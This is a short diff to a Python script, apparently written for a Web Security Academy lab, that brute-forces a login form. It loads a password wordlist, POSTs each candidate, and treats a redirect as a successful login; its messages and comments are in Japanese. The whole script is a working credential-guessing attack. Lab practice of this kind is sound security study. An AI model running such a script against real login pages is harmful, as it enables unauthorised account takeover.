@@ -1,11 +1,16 @@
+from pathlib import Path
+
 import requests
+
+ROOT = Path(__file__).resolve().parent.parent
+PASSWORDS_FILE = ROOT / "wordlists" / "passwords.txt"
 
 URL = "0a1c000f04e725b280e1357600e700fe.web-security-academy.net"
 
-with open("passwords.txt", "r") as f:
+with open(PASSWORDS_FILE, "r") as f:
     passwords = f.read().splitlines()
 
-print("[*] ユーザー名の列挙（Enumeration）を開始します！")
+print("[*] パスワードリストによる総当たりを開始します")
 
 for password in passwords:
     data = {
@@ -13,7 +18,7 @@ for password in passwords:
         "password": password
     }
 
-    # リダイレクト有無を判定するため、POST後に自動追従しない
+    # リダイレクトの有無で成否を判定するため、自動追従は無効化する
     response = requests.post(URL, data=data, allow_redirects=False, timeout=10)
 
     is_redirect = response.is_redirect or response.is_permanent_redirect
